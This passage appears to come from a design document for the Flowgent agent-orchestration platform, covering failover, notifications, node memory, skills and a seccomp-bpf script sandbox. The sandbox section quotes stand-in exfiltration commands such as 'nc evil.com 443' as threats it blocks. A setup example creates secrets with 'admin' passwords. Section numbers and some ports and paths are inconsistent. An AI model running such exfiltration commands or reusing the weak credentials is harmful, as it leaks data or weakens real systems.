     result := rm.Schedule(plan)  → MQTT (K8s) or standalone slot (all-in-one)
     Done(node) / Fail(node)
     condition → SetConditionResult → Skip(false-branch)
     supervisor → validate action → Inject/Retry/Abort

5. RM DISPATCH
   → Evaluates pending plans vs free slots
   → StandaloneRM: goroutine pool, returns INSUFFICIENT_RESOURCES if full
   → K8sRM: publishes plan to MQTT topic, TM pods consume;
     auto-scales TM replicas based on queue depth (application mode)

6. TM EXECUTION
   → SlotWorker dequeues ExecutionPlan from MQTT / channel
   → ExecutorRouter dispatches to correct executor (agent/tool/supervisor/...)
   → Result published back to JM via MQTT

7. COMPLETION
   → IsComplete() → run.Status = COMPLETED
   → HasFailed()  → run.Status = FAILED
   → Persist final state to PG
```

### 10.4 TM Failover

```
1. TM sends heartbeat every 5s
2. JM's K8s RM detects missing heartbeat after 30s
3. Dead TM's leases expire → plans re-claimed by other TMs
4. K8s Deployment controller restarts dead TM pod
5. Orphaned plans re-executed from checkpoint
```

---

## 11. Notifier Service — MQTT Consumer + Multi-Channel Push (NO DB)

Bridges internal agentflow events to external communication channels.

### 11.1 Architecture

```
  ┌────────────────────────────────────────────┐
  │       Notifier Service (2+ pods)        │
  │  ┌──────────────────┐  ┌────────────────┐  │
  │  │ MQTT Queue       │  │ Human Approval │  │
  │  │ Consumer         │  │ Scanner (5s)   │  │
  │  │ Topic: /flowgent/│  │ SELECT PENDING │  │
  │  │ notify/queue/    │  │ human_approvals│  │
  │  │ {tenant}/{flow}  │  └───────┬────────┘  │
  │  └────────┬─────────┘          │           │
  │           └──────────┬─────────┘           │
  │                      ▼                     │
  │           ┌──────────────────┐            │
  │           │ Channel Dispatcher│            │
  │           │ Slack/DingTalk/   │            │
  │           │ Telegram/Email/   │            │
  │           │ Webhook           │            │
  │           └──────────────────┘            │
  └────────────────────────────────────────────┘
```

### 11.2 Queue Consumer

MQTT shared subscription per tenant+flow: `/flowgent/notify/queue/{tenant}/{flow}`.
Messages load-balanced across notifier pods. Each message dispatched to
configured channels for that tenant.

### 11.3 IDiscoveryClient — Pluggable Service Discovery

```go
type IDiscoveryClient interface {
    DiscoverPeers(ctx, labelSelector) ([]Peer, error)
    Self() Peer
    IsLeader(ctx, labelSelector) (bool, error)
    WatchPeers(ctx, labelSelector) (<-chan []Peer, error)
}
```

Implementations: `K8sDiscoveryClient` (label-selector pod listing, like Flink's
KubernetesHA), `StaticDiscoveryClient` (env-var based, for dev/CI).

---

## 12. Agent Node Memory

Each (flow_definition, node) pair accumulates a persistent memory entry. Unlike
run-scoped memory, `NodeMemory` survives across ALL runs of the same flow —
restarts and interruptions automatically benefit from prior execution context.

### 12.1 Model

```go
type NodeMemory struct {
    FlowID    string         // agentflow definition ID (NOT run ID)
    NodeID    string         // DAG node ID (empty = flow-level shared)
    Content   string         // accumulated execution context (appended each run)
    Embedding []float32      // vector for similarity search
    Metadata  map[string]any // {retry_count, last_error, last_model, token_usage, ...}
}
```

**Scoping rule**: memory is keyed by `(flow_id, node_id)` — same flow definition + same
node, across all runs. Run ID is NOT part of the key. Cross-flow memory sharing is
intentionally NOT supported (simplicity).

### 12.2 Lifecycle

```
1. BEFORE LLM call:
   GetMemory(flowID, nodeID)
   → if found, append prior content to prompt as context

2. AFTER each attempt:
   UpsertMemory({ flowID, nodeID, content })  ← accumulates, doesn't replace

3. Content grows monotonically:
   "attempt=0 prompt=... response=... error=..."
   "attempt=1 prompt=... response=..."
   → Richer context for every subsequent run
```

### 12.3 PG Schema

```sql
CREATE TABLE node_memories (
    flow_id    VARCHAR(255) NOT NULL,
    node_id    VARCHAR(255) NOT NULL DEFAULT '',
    content    TEXT NOT NULL,
    embedding  JSONB,
    metadata   JSONB DEFAULT '{}',
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW(),
    PRIMARY KEY (flow_id, node_id)
);
```

### 12.4 Store Interface

```go
type NodeMemoryStore interface {
    GetMemory(ctx, flowID, nodeID string) (*NodeMemory, error)
    UpsertMemory(ctx, mem *NodeMemory) error
    SearchMemory(ctx, flowID string, embedding []float32, topK int) ([]NodeMemory, error)
    ListFlowMemories(ctx, flowID string) ([]NodeMemory, error)
    DeleteMemory(ctx, flowID, nodeID string) error
}
```

The `AgentExecutor` accepts an optional `NodeMemoryStore`; when present, memory is
persisted after each attempt and queried before LLM calls.

---

## 13. Metrics & Observability

OpenTelemetry integration with configurable exporters:

| Signal | Implementation | Config |
|--------|---------------|--------|
| Traces | W3C TraceContext propagation through MQTT | `mgmt.otel` |
| Metrics | Prometheus exporter, custom histogram buckets per domain | `mgmt.metrics.prometheus` |
| pprof | Debug endpoints at `:6669` | `mgmt.pprof` |

Histogram boundaries (from sample config):
- Task execution: `[0.1, 0.5, 1, 2, 5, 10, 30, 60, 120]s`
- LLM calls: `[0.5, 1, 2, 5, 10, 30, 60, 120, 300]s`
- Queue latency: `[0.01, 0.05, 0.1, 0.5, 1, 5, 10, 30]s`

---

## 16. Key Design Constraints

| Constraint | Rationale |
|-----------|-----------|
| Only `agent` and `supervisor` use LLM | All other nodes must be deterministic |
| Vote must be deterministic | LLM "judges", vote "decides" |
| Agent output must be JSON | Machine-readable, auditable |
| Supervisor actions constrained | redirect/retry/inject/abort only |
| Human node must persist + timeout | DB-backed, resume via API |
| Map must support nesting | Multi-level fan-out |
| Sandbox network isolation must be per-execution, not per-pod | Network policy is defined per-flow per-node. The same sandbox pod executes scripts for different flows concurrently. Pod-level mechanisms (iptables, Istio sidecar, K8s NetworkPolicy) cannot enforce per-execution allowlists. seccomp-bpf + userspace notifier gives dynamic per-thread filtering — see §15. |

---

## 16. File Map

The codebase is a Go workspace (`go.work`) joining 10 modules with a strictly
acyclic dependency graph. `cmd` is the leaf — it depends on everything.
`common` is the root — zero dependencies.

```
common (zero deps)
  ↑
model (→ common)
  ↑
  ├─ messaging (→ common + model)   [ex-queue]
  ├─ cache (→ common + model)
  └─ config (→ common + model + cache)
       ↑
       ├─ wallet (→ common + model)   [ex-payments]
       ├─ notifier (→ config + messaging + model)
       ├─ sandbox (→ common + model + messaging)   [ex-sandbox-exec]
       └─ core (→ config + messaging + model + cache + notifier + wallet + sandbox)
             ↑
             └─ cmd (→ everything)
```

| # | Module | Path | Module Path | Depends On |
|---|--------|------|-------------|------------|
| 1 | common | `src/common/` | `flowgent/common` | (none) |
| 2 | model | `src/model/` | `flowgent/model` | common |
| 3 | messaging | `src/messaging/` | `flowgent/messaging` | common, model |
| 4 | cache | `src/cache/` | `flowgent/cache` | common, model |
| 5 | config | `src/config/` | `flowgent/config` | common, model, cache |
| 6 | wallet | `src/wallet/` | `flowgent/wallet` | common, model |
| 7 | notifier | `src/notifier/` | `flowgent/notifier` | config, messaging, model |
| 8 | sandbox | `src/sandbox/` | `flowgent/sandbox` | common, model, messaging |
| 9 | core | `src/core/` | `flowgent/core` | config, messaging, model, cache, notifier, wallet, sandbox |
| 10 | cmd | `src/cmd/` | `flowgent/cmd` | all above |

### common (`src/common/src/`) — Module 1 (root)

| Path | Role |
|------|------|
| `tracing/` | OTEL tracer/metrics provider; defines its own OTELConfig, MetricsConfig |
| `utils/` | Structured logger (slog wrapper), utilities |

### model (`src/model/src/`) — Module 2

| Path | Role |
|------|------|
| `*.go` | Shared domain types: AgentFlowSpec, Node, Edge, Run, NetworkPolicy, SandboxPolicy, ExecutionPlan, etc. |

### messaging (`src/messaging/src/`) — Module 3 (ex-`queue`)

| Path | Role |
|------|------|
| `queue.go` | Queue interface (Push/Pop/Dequeue/Ack/Nack/Heartbeat) + Message/Heartbeat types |
| `memory.go` | In-memory queue (goroutine-safe) |
| `mqtt.go` | MQTT queue (EMQX) for distributed mode |
| `metrics.go` | OTEL metrics for queue operations |

### cache (`src/cache/src/`) — Module 4

| Path | Role |
|------|------|
| `cache.go` | ICache interface |
| `memory.go` | In-memory LRU cache; defines MemoryCacheConfig |
| `redis.go` | Redis cache (standalone/cluster/sentinel); defines RedisCacheConfig |

### config (`src/config/src/`) — Module 5

| Path | Role |
|------|------|
| `config.go` | Top-level ServiceConfig; type aliases to leaf module config types; YAML/viper loading |

### wallet (`src/wallet/src/`) — Module 6 (ex-`payments`)

| Path | Role |
|------|------|
| `model.go` | Payment domain types |
| `wallet/` | Wallet client |
| `facilitator/` | x402 facilitator |
| `approvals/` | Human approval persistence |
| `policy/`, `pwf/`, `x402/`, `providers/`, `receipts/` | Payment subsystem |

### notifier (`src/notifier/src/`) — Module 7

| Path | Role |
|------|------|
| `notifier.go` | Notifier service + MQTT subscriber + WS hub + channel senders |

### sandbox (`src/sandbox/src/`) — Module 8 (ex-`sandbox-exec`)

| Path | Role |
|------|------|
| `sandbox/` | SandboxRunner lifecycle, script execution, policy validation |
| `seccomp/` | seccomp-bpf filter builder/installer, USER_NOTIF handler, re-exec child |

### core (`src/core/src/`) — Module 9

| Path | Role |
|------|------|
| `api/` | REST API handlers (CRUD, trigger, runs, human approval) |
| `engine/executor/` | 10 TaskExecutor implementations |
| `engine/jobmanager/` | JobManager + JobMaster DAG orchestrator |
| `engine/resourcemanager/` | ResourceManager (Local + Kubernetes) |
| `engine/taskmanager/` | SlotWorker pool + heartbeat |
| `engine/discovery/`, `engine/checkpoint/`, `engine/trigger/` | Engine subsystems |
| `store/` | PostgreSQL + SQLite store implementations |
| `llm/` | LLM client (OpenAI-compatible) + MCP factory |
| `lock/` | Distributed lock (memory/Redis/Postgres) |
| `migration/` | DDL migration scripts |

### cmd (`src/cmd/src/flowgent/`) — Module 10 (leaf)

| Path | Role |
|------|------|
| `main.go` | CLI entry (cobra): all-in-one, apiserver, controller, jm, tm |
| `launch.go` | Subsystem init — wires all modules together |
| `console.go` | Interactive console |

### Deployment

| Path | Role |
|------|------|
| `deploy/helm/flowgent/` | Helm chart (7 microservices × 2 replicas) |
| `deploy/docker/Dockerfile` | Container image |

---

## 13. Skills = Sub-AgentFlow

### 13.1 Core Insight

**A Skill is a sub-AgentFlow.** Nothing more. A "skill" accomplishes a task — which inherently means orchestrating multiple tools and/or agents. That's exactly what an AgentFlow is. Users migrating from Claude Code, Codex, Copilot, or any other agent framework can drop their existing skills into Flowgent as AgentFlow YAML files and reference them as `type: agentflow` nodes.

No new abstractions. No new executors. No ReAct loop. No mandatory schema.

### 13.2 AgentFlowSpec — Optional Fields for Skills

```go
type AgentFlowSpec struct {
    ID           string         `json:"id" yaml:"id"`
    Kind         string         `json:"kind,omitempty" yaml:"kind,omitempty"`           // "skill" | "" (empty = regular flow)
    Description  string         `json:"description,omitempty" yaml:"description,omitempty"`
    Summary      string         `json:"summary,omitempty" yaml:"summary,omitempty"`     // one-liner for A2A card
    InputSchema  *JSONSchema    `json:"input_schema,omitempty" yaml:"input_schema,omitempty"`
    OutputSchema *JSONSchema    `json:"output_schema,omitempty" yaml:"output_schema,omitempty"`
    Vars         map[string]any `json:"vars,omitempty" yaml:"vars,omitempty"`
    Nodes        []Node         `json:"nodes" yaml:"nodes"`
    Edges        []Edge         `json:"edges" yaml:"edges"`
    Triggers     []TriggerDef   `json:"triggers,omitempty" yaml:"triggers,omitempty"`
}
```

`input_schema` and `output_schema` are entirely optional. Schemas are purely for A2A discovery and optional validation.

### 13.3 Migration — Zero Friction

```yaml
# etc/skills/01-dependency-scan.yaml
id: dependency-scan
kind: skill
summary: "Scan project dependencies for known CVEs"
nodes:
  - id: clone
    type: tool
    tool: github
    input: { action: clone_repo, url: "${input.repo_url}" }
  - id: scan
    type: tool
    tool: dependency-checker
    input: { path: "${clone.output.path}" }
  - id: normalize
    type: agent
    agent: issue-detector
    input: { raw_output: "${scan.output}" }
edges:
  - { from: clone, to: scan }
  - { from: scan, to: normalize }
```

Reference from any flow: `type: agentflow`, `agentflow: dependency-scan`.

### 13.4 Why Skill Instead of MCP Tool — The Nexus3 Case

A real example from the Security Autonomy Fixer flow illustrates when to use a skill
rather than a standalone MCP tool server.

**Problem:** The flow needs to fetch the latest top-3 Maven dependency versions where
SonatypeIQ `firewall.status=allow` (i.e., not quarantined). In a licensed enterprise
Nexus3 deployment, the SonatypeIQ integration makes firewall status visible in both
the Nexus3 UI and REST API. A simple MCP tool wrapping the Nexus3 swagger would suffice.

However, Nexus3 open-source and personal deployments **lack the SonatypeIQ license**,
so:
- The Nexus3 UI shows no firewall status column
- The Nexus3 REST API swagger does not return `firewall.status` in component listings

**Solution:** Replace the Nexus3 MCP tool with a **skill** — a sub-AgentFlow that wraps
existing copilot scripts. These scripts directly call:
- `gh` CLI for GitHub API access
- Nexus3 web API for component metadata
- `gcloud` CLI for artifact registry queries

The skill orchestrates these deterministic calls and returns the filtered top-3 versions,
exactly as the MCP tool would — but without requiring the SonatypeIQ license.

**Design principle:** When a third-party system's API varies between licensed and
open-source editions, prefer a skill. Skills embed operational knowledge (which APIs
to call, in what order, how to parse responses) that would otherwise become brittle
configuration inside an MCP tool. Skills are also easier to customize per deployment
environment (dev/staging/production) without rebuilding any binaries.

```yaml
# In the flow YAML — skill replaces MCP tool
- id: fetch-safe-deps
  skill: nexus3-retrieval
  input:
    repo: "${vars.repo}"
    maven_coordinates: "${scan-sonatypeiq.maven_coords}"
    top_n: 3
```

This is the same `type: skill` / `type: agentflow` mechanism described in §13.1–13.3.
No new executors. No new abstractions. Just a flow referencing another flow.

---

## 14. Agent Definition — No Toolsets

### 14.1 Tools Belong to the DAG, Not the Agent

Tools are deterministic DAG nodes (`type: tool`). The flow designer decides which tool to call, at which step, with which inputs. The agent receives tool output and reasons about it — it never decides to call a tool itself. This is the architectural line between enterprise orchestration (DAG-controlled) and personal AI assistants (ReAct loop).

### 14.2 AgentDef — Structured Additions

```go
type AgentDef struct {
    Name         string      `json:"name" yaml:"name"`
    Model        string      `json:"model" yaml:"model"`
    Soul         string      `json:"soul" yaml:"soul"`
    Instruction  string      `json:"instruction" yaml:"instruction"`
    OutputSchema *JSONSchema `json:"output_schema,omitempty" yaml:"output_schema,omitempty"`
    Temperature  *float64    `json:"temperature,omitempty" yaml:"temperature,omitempty"`
    MaxTokens    int         `json:"max_tokens,omitempty" yaml:"max_tokens,omitempty"`
}
```

| Field | Why |
|-------|-----|
| `output_schema` | Structured output contract — replaces prose "Output STRICT JSON: {...}" in `instruction`. Enables validation. |
| `temperature` | Per-agent override. Supervisor needs 0.2; creative reviewer may want 0.5. |
| `max_tokens` | Output length control per agent role. |

---

## 15. Sandbox — Secure Script Execution

The sandbox executes scripts (Python, Bash, Node) generated by agents or skills.
It runs as a standalone microservice (`flowgent sandbox start`), consuming trigger
messages from the queue and reading/writing files through a shared workspace volume.

### 15.1 Dual Persistence Model

| Type | Storage | Survives | Example |
|------|---------|----------|---------|
| **Work data** (files) | Workspace volume (PVC) | Pod restart, cluster reboot | Code patches, scripts, build artifacts |
| **Shared memory** (knowledge) | Storage (SQLite / PostgreSQL) | Everything | Agent conversation history, run progress |

### 15.2 Workspace Path Convention

```
{workspace}/{tenant}/{definition_id}/runs/{run_id}/plans/{plan_id}/{span_id}/
  ├── script.{py,sh,js}
  ├── result.json
  ├── status
  └── original/   (pre-modification snapshot)
```

### 15.3 Security Policy — 3-Level Override

| Level | Config Source | Scope |
|-------|--------------|-------|
| Global | `flowgent.yaml` → `sandbox.policy` | All sandbox executions |
| Flow | `AgentFlowSpec.sandbox_policy` | All nodes in a flow |
| Node | `Node.network_policy` | Single node |

Resolution: node override > flow override > global default. See
`model.EffectiveNetworkPolicy()`.

### 15.4 Network Isolation — seccomp-bpf + Userspace Notifier

**Why not iptables / Istio / K8s NetworkPolicy?**

Network policy is defined per-flow per-node. The same sandbox pod executes scripts
for different flows concurrently. All pod-level mechanisms are **static** — they apply
uniformly to every process in the pod from the moment the pod starts:

| Mechanism | Level | Dynamic per-execution? | Escape vector |
|-----------|-------|----------------------|---------------|
| iptables | pod netns | No — rules apply to all processes | Process with `NET_ADMIN` can delete rules |
| Istio/envoy sidecar | pod | No — sidecar injected at pod creation | Process can delete iptables redirect rules |
| K8s NetworkPolicy | pod | No — enforced by CNI at pod boundary | Process inside pod is already past the boundary |
| ALL_PROXY env | process | Yes, but advisory only | `unset ALL_PROXY; nc evil.com 443` |
| **seccomp-bpf + notifier** | **per-thread** | **Yes — filter installed before each script** | **Kernel-enforced, process cannot remove** |

**Architecture:**

```
SandboxRunner (Go process)
  │
  ├─→ Before each script execution:
  │     1. Pre-resolve allowlist hostnames → IPs
  │        (e.g. nexus3:8081 → 10.43.162.201:8081)
  │     2. Build seccomp-bpf filter program:
  │        - Block socket(AF_INET, SOCK_RAW, *)       → EPERM
  │        - Block bpf(), init_module(), kexec_load() → EPERM
  │        - sendto/sendmsg/sendmmsg to port 53       → ALLOW (DNS)
  │        - connect/sendto/sendmsg/sendmmsg          → USER_NOTIF
  │        - Everything else                          → ALLOW
  │     3. Install filter via seccomp(SECCOMP_SET_MODE_FILTER,
  │        SECCOMP_FILTER_FLAG_TSYNC)
  │
  ├─→ Start notifier goroutine:
  │     - Reads seccomp notify fd
  │     - For each SECCOMP_RET_USER_NOTIF event:
  │       - Read /proc/<pid>/mem at args[1] to get sockaddr
  │       - If (ip, port) in allowlist → SECCOMP_USER_NOTIF_FLAG_CONTINUE
  │       - Else → respond with error (EPERM)
  │
  ├─→ exec.Command("bash", scriptFile)    ← child inherits filter
  │     - Script calls curl nexus3:8081
  │     → glibc: getaddrinfo("nexus3") → DNS lookup (UDP 53, allowed by BPF)
  │     → glibc: connect(fd, {10.43.162.201, 8080})
  │     → Kernel seccomp: USER_NOTIF → notifier checks IP+port → ALLOW
  │     → Script calls nc evil.com 443
  │     → Kernel seccomp: USER_NOTIF → notifier checks IP+port → DENY (EPERM)
  │
  └─→ After script exits:
        - Child process dies → filter auto-released (no cleanup needed)
        - Notifier goroutine exits
```

**Syscall coverage — every egress path blocked:**

| Syscall | Protocol | Intercepted? | Notes |
|---------|----------|-------------|-------|
| `connect()` | TCP (and UDP with connected socket) | Yes — BPF sends to notifier | Most common path (curl, wget, http clients) |
| `sendto()` | UDP (and TCP fast-path) | Yes — BPF sends to notifier | DNS allowed unconditionally (port 53) |
| `sendmsg()` | UDP/TCP with scatter-gather | Yes — BPF sends to notifier | Used by sendmmsg, advanced socket APIs |
| `sendmmsg()` | Batch sendmsg | Yes — BPF sends to notifier | Same check as sendmsg |
| `socket()` | Socket creation | Yes — BPF blocks SOCK_RAW directly | Prevents raw IP packet injection |
| `exec 3<>/dev/tcp/h/p` | Bash TCP pseudo-device | Yes — bash internally calls connect() | No special handling needed |
| `bpf()` | BPF syscall | Yes — blocked unconditionally | Prevents process from installing its own seccomp |
| `init_module()` | Kernel module load | Yes — blocked unconditionally | Privilege escalation prevention |
| `kexec_load()` | Kernel execution | Yes — blocked unconditionally | Privilege escalation prevention |
| `perf_event_open()` | Performance monitoring | Yes — blocked unconditionally | Can be used for side-channel attacks |

**DNS — why it's unconditionally allowed at the BPF level:**

Standard DNS resolution in glibc uses `sendto()` with the resolver address (e.g.,
`127.0.0.1:53` or the pod's DNS server). The target address is passed directly in
the syscall arguments, not through a prior `connect()`. Allowing `sendto`/`sendmsg`
to port 53 lets the script resolve hostnames. The actual TCP/UDP connections to
the resolved IPs are then checked by the notifier.

This means hostname leak via DNS queries IS possible (the script can `dig` any
domain). But the actual data exfiltration connection is blocked at the `connect()`
level. If DNS exfiltration itself is a concern (TXT record tunneling, ~200 bytes
per query), the DNS port can be restricted to specific resolver IPs in the future.

**Why not `SECCOMP_RET_TRAP` (SIGSYS)?** SIGSYS kills the process. For network
filtering, we need "allow some, deny others" — USER_NOTIF is the only mechanism
that can inspect arguments and make a per-call decision without killing the process.

**Why not `SECCOMP_RET_ERRNO` directly?** ERRNO returns immediately without
inspecting the target address. We can't distinguish `nexus3:8081` (allowed) from
`evil.com:443` (denied) without reading the sockaddr.

**Docker mode:** When `sandbox.image` is configured, the Docker container runs with
`--network=none` plus the seccomp filter as an additional layer. The seccomp filter
is still installed on the docker/docker process that spawns the container, providing
defense-in-depth.

**Process mode (no Docker):** seccomp filter is the primary and only enforcement
mechanism. Installed on the child process via `exec.Cmd.SysProcAttr`.

### 15.5 Execution Model (Multi-Module)

The sandbox subsystem spans two Go modules:

```
src/core/ (engine)                       src/sandbox-exec/ (executor)
─────────────────────────               ─────────────────────────
SandboxExecutor (TM side)               SandboxRunner (worker side)
  → Build workspace path                  → Dequeue trigger
  → Write script + snapshot               → Read script from path
  → Push trigger to queue ───MQTT──→      → BuildFilter(network_policy)
  → Pop result ←────────────MQTT──        → Install seccomp (TSYNC)
                                           → Start notifier goroutine
                                           → Execute script
                                           → Write result.json
                                           → Push result to queue
```

Communication between modules is via queue messages only — no Go import dependency.
The `SandboxExecutor` in core and `SandboxRunner` in sandbox-exec share the trigger
message format (defined in core's `model.SandboxTrigger`) and the workspace volume.

```
Sandbox Worker (per-execution lifecycle):
  → Dequeue trigger
  → Read script from workspace path
  → Pre-resolve allowlist hosts → IPs
  → Build seccomp-bpf filter from resolved IPs + port list
  → Install filter (SECCOMP_FILTER_FLAG_TSYNC)
  → Start notifier goroutine (reads seccomp notify fd)
  → Execute: bash/python3/node script.sh
  → Wait for child process exit
  → Notifier auto-exits (filter dies with child)
  → Write result.json + status to workspace path
  → Push result to queue
```


### 15.6 Workspace — Unified PVC Design

Both session and application modes use a **ReadWriteMany PVC** for the sandbox
workspace, provisioned once and shared across all sandbox pods.

```tree
/var/flowgent/workspace/
├── {tenant}/
│   └── {definition_id}/
│       ├── skills/                     ← skill scripts (read-only reference)
│       └── runs/{run_id}/plans/{plan_id}/{span_id}/
│           ├── script.sh               ← written by SandboxExecutor
│           ├── result.json             ← written by SandboxRunner
│           └── status
```

| Mode | Workspace Path | Provisioning |
|------|---------------|-------------|
| Session | `/var/flowgent/workspace/{tenant}/{definition_id}/` | PVC (Helm pre-creates) |
| Application | `/var/flowgent/workspace/{tenant}/{definition_id}/` | PVC (same path convention) |
| All-in-one | `os.TempDir()` | Process-local |

Both modes use the same path convention — different tenants and flows are
isolated by subdirectory, not by separate volumes.

### 15.7 Credential Injection

External service credentials are injected into sandbox pods via K8s secrets,
then inherited by child processes during script execution:

```yaml
# deploy/helm/flowgent/values.yaml
sandbox:
  credentials:
    nexus3:     { url: "http://nexus3:8081", secret: "nexus3-creds" }
    sonatypeiq: { url: "http://sonatypeiq:8070", secret: "iq-creds" }
```

```bash
# Create secrets once per cluster
kubectl create secret generic nexus3-creds \
  --from-literal=username=admin --from-literal=password=admin
kubectl create secret generic iq-creds \
  --from-literal=username=iq-user --from-literal=password=iq-pass
```

- The sandbox runner passes all env vars to child processes:

```go
cmd.Env = append(os.Environ(), "HOME=/tmp", "SANDBOX_MODE=1")
```

- Scripts read credentials directly from env:

```bash
curl -u "${NEXUS3_USER}:${NEXUS3_PASSWORD}" "$NEXUS3_URL/..."
```

Secrets never appear in flow YAML or workspace files.

### 15.8 CLI

```bash
./bin/flowgent sandbox start
```

---

## 16. Directory-Based Configuration

### 16.1 Config Layout

```yaml
orchestration:
  mcps: [...]
  agents:
    static:  { enabled: true, load-dir: "agents/",  refresh: 30s }
    standard: { enabled: false }   # DB-backed (future UI)
  skills:
    static:  { enabled: true, load-dir: "skills/",  refresh: 30s }
    standard: { enabled: false }
  agentflows:
    static:  { enabled: true, load-dir: "flows/",   refresh: 1m }
    standard: { enabled: false }
```

### 16.2 Directory Layout

- Default Static Manifest defintions

```tree
etc/
├── flowgent.yaml
└── {UseCase}/
    ├── agents/              # 01-supervisor.yaml, 02-issue-detector.yaml, ...
    ├── flows/               # 01-security-autonomy-fixer.yaml, ...
    └── skills/              # 01-dependency-scan.yaml, ...
```

`01-` prefix is a convention for human readability and deterministic load order. The loader sorts files alphabetically.

### 16.3 Static Manifest Loader

```go
func loadResourceDir[T any](dir string) ([]T, error) {
    entries, _ := os.ReadDir(dir)
    var result []T
    for _, e := range entries {
        if e.IsDir() || filepath.Ext(e.Name()) != ".yaml" { continue }
        data, _ := os.ReadFile(filepath.Join(dir, e.Name()))
        var item T
        yaml.Unmarshal(data, &item)
        result = append(result, item)
    }
    return result, nil
}
```
